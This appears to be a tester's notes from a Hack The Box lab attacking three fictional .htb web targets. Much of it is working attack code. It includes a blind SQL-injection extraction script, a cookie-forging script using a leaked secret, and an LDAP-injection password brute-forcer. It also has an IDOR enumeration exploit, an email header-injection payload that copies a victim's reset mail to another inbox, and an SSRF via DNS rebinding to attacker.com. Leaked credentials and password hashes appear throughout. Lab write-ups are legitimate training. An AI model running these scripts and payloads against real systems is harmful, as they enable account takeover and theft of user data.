# ROYAL FLUSH

emails:
admin@royalflush.htb
security@royalflush.htb
developer@royalflush.htb

### WWW.royalflush.htb.com

## SQLI AT https://www.royalflush.htb/forgot


### Request 
```POST /forgot HTTP/1.1
Host: www.royalflush.htb
Cookie: session=eyJjc3JmX3Rva2VuIjoiOWM3NWFjZmMxNWMxZDgyNjAxNTk2Y2YxY2FjNDczODk3N2ExZDQ2YSJ9.anbeug.j36tmt5PANRFiIG2D62bEhlbUbo
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Origin: https://www.royalflush.htb
Referer: https://www.royalflush.htb/forgot
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

email=asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'&csrf_token=IjljNzVhY2ZjMTVjMWQ4MjYwMTU5NmNmMWNhYzQ3Mzg5NzdhMWQ0NmEi.anbewQ.zb1KnWGEDBsZOMxVhX87RuuN-fo
```

![[Screenshot from 2026-08-08 19-00-27.png]]

Result: Sleep 10 seconds


### dumbing users emails and usernames

```#!/usr/bin/env python3  
"""  
Extract username + email for users with a given role_id from RoyalFlush /forgot SQLi.  
Default role_id=1 (regular users). Change ROLE_ID below to extract other roles.  
"""  
  
import warnings  
warnings.filterwarnings("ignore")  
  
import re  
import time  
import urllib3  
import requests  
  
urllib3.disable_warnings()  
  
BASE_URL = "https://www.royalflush.htb"  
FORGOT_URL = f"{BASE_URL}/forgot"  
SLEEP = 3  
THRESHOLD = SLEEP * 0.7  
ROLE_ID = 1  # change to 2 for admins  
  
HEADERS = {  
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",  
    "Accept": "*/*",  
    "Accept-Language": "en-US,en;q=0.9",  
    "Accept-Encoding": "gzip, deflate, br",  
    "Content-Type": "application/x-www-form-urlencoded",  
    "Origin": "https://www.royalflush.htb",  
    "Referer": "https://www.royalflush.htb/forgot",  
    "Upgrade-Insecure-Requests": "1",  
    "Sec-Fetch-Dest": "document",  
    "Sec-Fetch-Mode": "navigate",  
    "Sec-Fetch-Site": "same-origin",  
    "Sec-Fetch-User": "?1",  
    "Priority": "u=0, i",  
    "Te": "trailers",  
    "Connection": "keep-alive",  
}  
  
  
def get_csrf_and_session():  
    s = requests.Session()  
    s.headers.update(HEADERS)  
    r = s.get(FORGOT_URL, verify=False, timeout=15)  
    m = re.search(r'<input\b[^>]*name\s*=\s*"csrf_token"[^>]*value\s*=\s*"([^"]+)"', r.text)  
    if not m:  
        m = re.search(r'<input\b[^>]*value\s*=\s*"([^"]+)"[^>]*name\s*=\s*"csrf_token"', r.text)  
    if not m:  
        raise RuntimeError(f"Could not extract csrf_token (status {r.status_code})")  
    return s, m.group(1)  
  
  
def send_payload(s, csrf, condition):  
    payload = f"habibhassan293@gmail.com'||(SELECT pg_sleep({SLEEP}) FROM users JOIN user_roles USING(user_id) WHERE ({condition}) LIMIT 1)::text||'"  
    data = {"email": payload, "csrf_token": csrf}  
    start = time.time()  
    try:  
        s.post(FORGOT_URL, data=data, verify=False, timeout=SLEEP + 10)  
    except requests.exceptions.ReadTimeout:  
        pass  
    return time.time() - start  
  
  
def is_true(s, csrf, condition):  
    return send_payload(s, csrf, condition) >= THRESHOLD  
  
  
def get_int(s, csrf, expr, hi=256):  
    low, high = 0, hi  
    while low < high:  
        mid = (low + high) // 2  
        if is_true(s, csrf, f"({expr}) > {mid}"):  
            low = mid + 1  
        else:  
            high = mid  
    return low  
  
  
def get_char(s, csrf, expr):  
    low, high = 32, 126  
    while low < high:  
        mid = (low + high) // 2  
        if is_true(s, csrf, f"COALESCE(ascii(({expr})),0) > {mid}"):  
            low = mid + 1  
        else:  
            high = mid  
    return chr(low) if low > 0 else ''  
  
  
def get_string(s, csrf, expr, label=""):  
    length = get_int(s, csrf, f"length(({expr}))")  
    print(f"[+] {label} length: {length}")  
    print(f"[*] extracting: ", end="", flush=True)  
  
    value = ""  
    for pos in range(1, length + 1):  
        c = get_char(s, csrf, f"substring(({expr}),{pos},1)")  
        if not c:  
            c = "?"  
        value += c  
        print(c, end="", flush=True)  
    print()  
    return value  
  
  
def main():  
    s, csrf = get_csrf_and_session()  
    print(f"[+] csrf_token: {csrf[:50]}...")  
  
    print("[*] Sanity check...")  
    t0 = send_payload(s, csrf, "1=0")  
    t1 = send_payload(s, csrf, "1=1")  
    print(f"    false -> {t0:.2f}s")  
    print(f"    true  -> {t1:.2f}s")  
    if t1 < THRESHOLD:  
        print("[!] Oracle failed. Adjust SLEEP.")  
        return  
  
    print(f"[*] Counting users with role_id={ROLE_ID}...")  
    count = get_int(s, csrf, f"SELECT count(*) FROM users JOIN user_roles USING(user_id) WHERE user_roles.role_id={ROLE_ID}", hi=64)  
    print(f"[+] {count} user(s) found\n")  
  
    users = []  
    for i in range(count):  
        print(f"[*] Extracting user #{i} (role_id={ROLE_ID})...")  
        expr = f"SELECT users.username||'|'||users.email FROM users JOIN user_roles USING(user_id) WHERE user_roles.role_id={ROLE_ID} ORDER BY users.user_id OFFSET {i} LIMIT 1"  
        data = get_string(s, csrf, expr, label=f"user #{i}")  
        parts = data.split("|")  
        users.append({  
            "username": parts[0] if len(parts) > 0 else "",  
            "email": parts[1] if len(parts) > 1 else "",  
        })  
        print(f"[+] user #{i}: {users[-1]}\n")  
  
    print(f"=== Users with role_id={ROLE_ID} ===")  
    for u in users:  
        print(f" - {u['username']} | {u['email']}")  
  
  
if __name__ == "__main__":  
    main()
```

this will give us multiple users 
`chandlerjoseph:lbrown@hotmail.com`

### Leaked secret keys 


![[Screenshot from 2026-08-08 19-36-31.png]]


### Forging Both chandler/Security Cookie
```
#!/usr/bin/env python3  
"""  
Forge RoyalFlush auth cookies for the two candidate admin emails.  
Requires production AUTH_SECRET.  
"""  
  
import yaml  
import hmac  
import hashlib  
import base64  
import time  
  
AUTH_SECRET = "862bfcb745b9a45f6d5a7c91492ce08a"  
  
  
def forge_cookie(email, username, expires_at):  
    y = yaml.dump({  
        'email': email,  
        'username': username,  
        'expires_at': expires_at  
    }).encode('utf-8')  
  
    h = hmac.new(  
        AUTH_SECRET.encode('utf-8'),  
        y,  
        hashlib.sha256  
    ).digest()  
  
    return base64.b64encode(h + y).decode()  
  
  
def main():  
    expires_at = int(time.time()) + 60 * 60 * 24 * 365 * 10  
  
    targets = [  
          
        ("lbrown@hotmail.com", "chandlerjoseph"),  
    ]  
  
    print("=== RoyalFlush Forged Admin Cookies ===\n")  
  
    for email, username in targets:  
        cookie = forge_cookie(email, username, expires_at)  
        safe = email.replace("@", "_").replace(".", "_")  
        filename = f"cookie_{safe}.txt"  
  
        with open(filename, "w") as f:  
            f.write(f"auth={cookie}\n")  
  
        print(f"Email:    {email}")  
        print(f"Username: {username}")  
        print(f"Cookie:   auth={cookie}")  
        print(f"Saved to: {filename}\n")  
  
  
if __name__ == "__main__":  
    main()
```

```
Email:    lbrown@hotmail.com
Username: chandlerjoseph
Cookie:   auth=mRrs0ml/xGSYtboCYb6paVx5eGs9r51O2jerqEC3j7BlbWFpbDogbGJyb3duQGhvdG1haWwuY29tCmV4cGlyZXNfYXQ6IDIxMDE1NjkzMjQKdXNlcm5hbWU6IGNoYW5kbGVyam9zZXBoCg==
Saved to: cookie_lbrown_hotmail_com.txt

```


![[Screenshot from 2026-08-08 20-17-39.png]]

Upgrading ROLE

in this code if you supply any param that has key , it will bypass the rule 

for example fookey
the code checks for 'key' which exists
the code checks if key="" but key param is none so this also checks
lastly it cehcks if api_key exists , which it doesnt so it also skip this step 
![[Screenshot from 2026-08-08 20-21-41.png]]

thus we upgrade user to ROLE 2 

![[Screenshot from 2026-08-08 22-22-12.png]]`

ROLE ADMIN

![[Screenshot from 2026-08-08 22-22-40.png]]




### forum.royalflush.htb
charles:charles

![[Screenshot from 2026-08-08 15-06-48.png]]


checking if user is staff based on the email
![[Screenshot from 2026-08-08 22-25-56.png]]

## no restriction on royalflush users creation

![[Screenshot from 2026-08-08 22-28-14.png]]
### NOSQLI at verify-email endpoint


![[Screenshot from 2026-08-08 18-25-39.png]]

### Server doesnt prevent any domains in registeration leading to registering email with domain name

### Passoword Leaked


![[Screenshot from 2026-08-08 18-58-23.png]]
john :   42zyTJ94BwdKjEw1XNmt
email leaked jdover66@royalflush.htb

![[Screenshot from 2026-08-09 08-34-45.png]]



## Vault.royalflush.htb

SQLI 


![[Screenshot from 2026-08-09 11-02-03.png]]







# vitamedix.htb

## Gathered INFO 
Emails: 
admin@vitamedix.htb
username:
admin:$2a$10$Z3ahuIDRzvgU7C5gz5gi9OGBoeZxOtzfmwTndnDoGyv0DwTz40pEa
henry: $2a$12$GCqpIpNXu4tGWXTm8b1XouoTxIJbZsqZNyozw4WAHDExZqj5SVM6e

superadmin1337
htb-stdnt



username found via ldap in 
## `ldap.vitamedix.htb`

```  
  
import requests  
import string  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
# ----------------------- CONFIG -----------------------  
BASE_URL   = "http://ldap.vitamedix.htb"  
LOGIN_URL  = f"{BASE_URL}/index.php"  
  
STATIC_PHPSESSID = "5buiqolv6gn4uoqccp3fuqiv4s"  # from your captured request  
  
HEADERS = {  
    "Host": "ldap.vitamedix.htb",  
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",  
    "Accept": "*/*",  
    "Accept-Language": "en-US,en;q=0.9",  
    "Accept-Encoding": "gzip, deflate, br",  
    "Content-Type": "application/x-www-form-urlencoded",  
    "Origin": BASE_URL,  
    "Referer": LOGIN_URL,  
    "Upgrade-Insecure-Requests": "1",  
    "Priority": "u=0, i",  
    "Connection": "keep-alive",  
}  
  
USERNAME_CHARSET = string.ascii_lowercase + string.digits + "_-."  
# Full printable ASCII (32 space .. 126 ~) so we brute every letter/digit/  
# symbol/shape possible, not just a guessed subset.  
PASSWORD_CHARSET = "".join(chr(i) for i in range(32, 127))  
  
# LDAP filter metacharacters that MUST be escaped (RFC 4515) whenever they  
# appear as literal data inside a filter value, or the server will parse  
# them as filter syntax instead of literal characters -- this would silently  
# corrupt prefix matching the moment a real password contains one of these.  
_LDAP_ESCAPES = {  
    "\\": "\\5c",  
    "*":  "\\2a",  
    "(":  "\\28",  
    ")":  "\\29",  
    "\x00": "\\00",  
}  
  
  
def ldap_escape(s: str) -> str:  
    return "".join(_LDAP_ESCAPES.get(ch, ch) for ch in s)  
  
KNOWN_FIRST_LETTERS = ["s", "h"]   # from what you already know  
MAX_LEN = 40                        # safety cap on extraction length  
THREADS = 20  
# --------------------------------------------------------  
  
session = requests.Session()  
session.headers.update(HEADERS)  
session.cookies.set("PHPSESSID", STATIC_PHPSESSID, domain="ldap.vitamedix.htb")  
_adapter = requests.adapters.HTTPAdapter(pool_connections=THREADS, pool_maxsize=THREADS)  
session.mount("http://", _adapter)  
session.mount("https://", _adapter)  
  
# filled in by calibrate()  
_success_len = None  
_failure_len = None  
_success_status = None  
_failure_status = None  
_success_location = None  
_failure_location = None  
_oracle_mode = None  # "status" | "location" | "length"  
  
  
def raw_login(username: str, password: str):  
    data = {"username": username, "password": password}  
    r = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=15)  
    return r  
  
  
def calibrate():  
    """  
    User has confirmed: HTTP 302 = successful login, HTTP 200 = failed login.    Still fires both requests once, just to print evidence and catch anything    unexpected (e.g. a WAF block) before running the full extraction.    """    global _success_status, _failure_status, _oracle_mode  
  
    _success_status = 302  
    _failure_status = 200  
    _oracle_mode = "status"  
  
    print("[*] Confirming oracle (302=success, 200=fail)...")  
    r_success = raw_login("*", "*")  
    r_failure = raw_login("definitely_not_a_real_user_xyz123", "definitely_not_a_real_pw_xyz123")  
    print(f"    success attempt -> status={r_success.status_code} "  
          f"location={r_success.headers.get('Location')}")  
    print(f"    failure attempt -> status={r_failure.status_code} "  
          f"location={r_failure.headers.get('Location')}")  
  
    if r_success.status_code != 302:  
        print(f"[!] Expected 302 on the known bypass but got {r_success.status_code}. "  
              f"Check the session cookie is still valid / the payload still works.")  
    if r_failure.status_code != 200:  
        print(f"[!] Expected 200 on the bogus login but got {r_failure.status_code}. "  
              f"Oracle may not be reliable -- verify before trusting extraction results.")  
  
  
def is_success(r) -> bool:  
    return r.status_code == _success_status  
  
  
def wildcard_prefix_matches(field: str, prefix: str, other_value: str) -> bool:  
    """  
    field: 'username' or 'password'    Tests whether <prefix>* matches something, with the other field    held constant (usually '*').    `prefix` is the literal data we've extracted so far (escaped here);    the trailing '*' we append is OUR wildcard operator, left unescaped    on purpose.    """    escaped = ldap_escape(prefix) + "*"  
    if field == "username":  
        r = raw_login(escaped, other_value)  
    else:  
        r = raw_login(other_value, escaped)  
    return is_success(r)  
  
  
def exact_matches(field: str, value: str, other_value: str) -> bool:  
    """Tests an EXACT (no trailing wildcard) match. Full value is escaped."""  
    escaped = ldap_escape(value)  
    if field == "username":  
        r = raw_login(escaped, other_value)  
    else:  
        r = raw_login(other_value, escaped)  
    return is_success(r)  
  
  
def find_next_char(field: str, prefix: str, charset: str, fixed_other_value: str):  
    """  
    Tests all charset characters for this position CONCURRENTLY    (up to THREADS at a time) and returns the first one that matches,    or None if none do.    """    with ThreadPoolExecutor(max_workers=THREADS) as ex:  
        futures = {  
            ex.submit(wildcard_prefix_matches, field, prefix + c, fixed_other_value): c  
            for c in charset  
        }  
        found = None  
        for fut in as_completed(futures):  
            c = futures[fut]  
            try:  
                if fut.result():  
                    found = c  
                    break  
            except requests.exceptions.RequestException as e:  
                print(f"    [!] request error testing '{c}': {e}")  
        # let any still-running requests finish in the background; we don't  
        # need their results once we have a match        return found  
  
  
def extract_field(field: str, charset: str, fixed_other_value: str, start_prefix: str = "") -> str:  
    """  
    Generic prefix-growing extraction for either username or password.    fixed_other_value: what to send for the OTHER field while extracting    this one (e.g. '*' for password while extracting username, or the    known exact username while extracting its password).    """    prefix = start_prefix  
    for _ in range(MAX_LEN):  
        # Termination check: does the current prefix match exactly already?  
        if prefix and exact_matches(field, prefix, fixed_other_value):  
            return prefix  
  
        c = find_next_char(field, prefix, charset, fixed_other_value)  
        if c is None:  
            break  
        prefix += c  
        print(f"    [{field}] so far: {prefix}", end="\r")  
    print()  
    return prefix  
  
  
def extract_username(start_letter: str) -> str:  
    print(f"[*] Extracting username starting with '{start_letter}'...")  
    return extract_field("username", USERNAME_CHARSET, fixed_other_value="*", start_prefix=start_letter)  
  
  
def extract_password(username: str) -> str:  
    print(f"[*] Extracting password for '{username}'...")  
    return extract_field("password", PASSWORD_CHARSET, fixed_other_value=username, start_prefix="")  
  
  
def main():  
    calibrate()  
  
    print(f"[*] Extracting usernames for prefixes {KNOWN_FIRST_LETTERS} "  
          f"concurrently ({THREADS} threads per position)...")  
    usernames = []  
    with ThreadPoolExecutor(max_workers=len(KNOWN_FIRST_LETTERS)) as ex:  
        futures = {ex.submit(extract_username, letter): letter for letter in KNOWN_FIRST_LETTERS}  
        for fut in as_completed(futures):  
            letter = futures[fut]  
            uname = fut.result()  
            print(f"[+] Username found (starts with '{letter}'): {uname}")  
            usernames.append(uname)  
  
    print(f"\n[*] Extracting passwords for {usernames} concurrently...")  
    results = {}  
    with ThreadPoolExecutor(max_workers=len(usernames)) as ex:  
        futures = {ex.submit(extract_password, u): u for u in usernames}  
        for fut in as_completed(futures):  
            uname = futures[fut]  
            pwd = fut.result()  
            print(f"[+] {uname} : {pwd}")  
            results[uname] = pwd  
  
    print("\n=== Extracted credentials ===")  
    for u, p in results.items():  
        print(f" {u} : {p}")  
  
  
if __name__ == "__main__":  
    main()
```

```
=== Extracted credentials ===
 htb-stdnt : 
 superadmin1337 : 

```

After trying emails in users.php
on forgot password , we get a valid email   `michael@vitamedix.htb`

![[Screenshot from 2026-08-09 17-19-23.png]]

### Storage.vitamedix

![[Screenshot from 2026-08-09 15-42-46.png]]

Now we have access to Storage.vitamedix
![[Screenshot from 2026-08-09 17-37-37.png]]

SMTP Creds Leaked via BOLA on file render.php

script
```python
#!/usr/bin/env python3  
"""  
Vitamedix Storage IDOR file enumeration exploit.  
  
Bug: reports.php stores the requested id in $_SESSION['id'].  
     render.php reads $_SESSION['id'] and displays the file WITHOUT     re-checking ownership, so any authenticated user can read any file.  
Usage:  
    python3 idor_enum.py --cookie "PHPSESSID=..." --start 1 --end 100"""  
  
import argparse  
import re  
import requests  
  
  
def parse_args():  
    parser = argparse.ArgumentParser(description="Enumerate file IDs via IDOR on storage.vitamedix.htb")  
    parser.add_argument("--host", default="http://storage.vitamedix.htb", help="Target base URL")  
    parser.add_argument("--cookie", default="icfj8f8jhsgqdf69cuh5r2e6hr", help="PHPSESSID cookie value (or full Cookie header)")  
    parser.add_argument("--start", type=int, default=1, help="Start ID")  
    parser.add_argument("--end", type=int, default=1000, help="End ID")  
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")  
    parser.add_argument("--proxy", default="http://127.0.0.1:8080", help="Proxy URL (default: Burp Suite http://127.0.0.1:8080)")  
    return parser.parse_args()  
  
  
def build_headers(cookie):  
    headers = {  
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",  
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
        "Accept-Language": "en-US,en;q=0.9",  
        "Accept-Encoding": "gzip, deflate, br",  
        "Referer": "http://storage.vitamedix.htb/profile.php",  
        "Connection": "keep-alive",  
        "Upgrade-Insecure-Requests": "1",  
    }  
  
    # support either raw PHPSESSID value or full Cookie header  
    if "=" in cookie:  
        headers["Cookie"] = cookie  
    else:  
        headers["Cookie"] = f"PHPSESSID={cookie}"  
  
    return headers  
  
  
def extract_title_or_body(html):  
    """Pull a meaningful snippet from the rendered page."""  
    # try to grab card-title and card-content  
    title_match = re.search(r'<h4 class="card-title">(.*?)</h4>', html, re.DOTALL)  
    body_match = re.search(r'<p>(.*?)</p>', html, re.DOTALL)  
  
    title = re.sub(r'<[^>]+>', '', title_match.group(1)).strip() if title_match else ""  
    body = re.sub(r'<[^>]+>', '', body_match.group(1)).strip() if body_match else ""  
    return title, body  
  
  
def main():  
    args = parse_args()  
    headers = build_headers(args.cookie)  
    proxies = {"http": args.proxy, "https": args.proxy}  
    session = requests.Session()  
    session.headers.update(headers)  
    session.proxies.update(proxies)  
  
    print(f"[*] Target: {args.host}")  
    print(f"[*] Cookie: {headers['Cookie']}")  
    print(f"[*] Proxy:  {args.proxy}")  
    print(f"[*] Enumerating ids {args.start} -> {args.end}")  
    print("=" * 80)  
  
    for file_id in range(args.start, args.end + 1):  
        try:  
            # Step 1: set session id via reports.php  
            reports_url = f"{args.host}/reports.php?id={file_id}"  
            r1 = session.get(reports_url, timeout=args.timeout, allow_redirects=False)  
  
            # Step 2: read the file via render.php using the same session  
            render_url = f"{args.host}/render.php"  
            r2 = session.get(render_url, timeout=args.timeout)  
  
            status1 = r1.status_code  
            location = r1.headers.get("Location", "")  
            status2 = r2.status_code  
  
            # Heuristic: if render.php returned content containing card-title,  
            # we likely got a real file. error.php is the failure case.            title, body = extract_title_or_body(r2.text)  
  
            # Print only if we got something interesting  
            if title or body:  
                print(f"[+] id={file_id} | reports={status1} -> {location} | render={status2}")  
                if title:  
                    print(f"    Title: {title[:200]}")  
                if body:  
                    print(f"    Body:  {body[:500]}")  
                print("-" * 80)  
            else:  
                print(f"[-] id={file_id} | reports={status1} -> {location} | render={status2} | no content")  
  
        except requests.RequestException as e:  
            print(f"[!] id={file_id} request failed: {e}")  
  
  
if __name__ == "__main__":  
    main()
```

result 

![[Screenshot from 2026-08-09 16-00-08.png]]


smtp-dev@vitamedix.htb
Test Credentials for Dev:- smtp-dev:03264b1a5592d59923f482046b87f869


![[Screenshot from 2026-08-09 17-19-56.png]]


at the reset password above we identified `michael@vitamedix.htb`
Now we send this payload 
`michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+`

and we get the victim password too
![[Screenshot from 2026-08-09 17-39-19.png]]

now we get access to vitamedix.htb with the creds michael:9ecf1ffe7c795099b8ad40d29aa37a83


![[Screenshot from 2026-08-09 17-47-58.png]]



WE got to pdf generation  and point it to our domain in the DNSrebinder command `attacker.com`
and we point it to 
`http://admin:C0uchDB@attacker.com:5984/users/admin`

we get this response
`{"_id":"admin","_rev":"1-
2bb338a880df5181a728ee2b9256af36","username":"admin","password":"Adm111n@341","full_name":"Administrator","role":"doctor","address":"Vitamedix"}`
### DNS.vitamedix

passowrd leaked for DNS.vitamedix:8006

```
version: '3'
services:

  pihole:
    container_name: pihole
    image: pihole/pihole:latest
    ports:
      - "53:53/tcp"
      - "53:53/udp"
      - "8006:80/tcp"
    environment:
      WEBPASSWORD: "pihole"
    volumes:
      - "./etc-pihole:/etc/pihole"
      - "./etc-dnsmasq.d:/etc/dnsmasq.d"
    dns:
      - 127.0.0.1
    restart: always
```

![[Screenshot from 2026-08-09 16-23-03 1.png]]then we login in with password pihole 

![[Screenshot from 2026-08-09 16-23-39.png]]we add our DNS server 

![[Screenshot from 2026-08-09 18-10-49.png]]

and run responder

```terminal
sudo python3 dnsrebinder.py --domain attacker.com --rebind 0.0.0.0 --ip 1.1.1.1 --counter 1 --tcp --udp
Starting nameserver...
UDP server loop running in thread: Thread-1 (serve_forever)
TCP server loop running in thread: Thread-2 (serve_forever)
/home/hassan/Desktop/scripts/DNSrebinder/dnsrebinder.py:110: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')


```


leaked internal url in code 

![[Screenshot from 2026-08-09 18-10-21.png]]



# Secure Data

Xpath injection in q param at query.php![[Screenshot from 2026-08-10 20-02-33.png]]


## Leaked Credenitial of testdeveloper

![[Screenshot from 2026-08-10 20-00-52.png]]

### Race Condition

by sending multiple requests to admin_panel.php and a logout request in a single packet attack , you will notice the admin panel returned to you 
![[Screenshot from 2026-08-11 00-49-21.png]]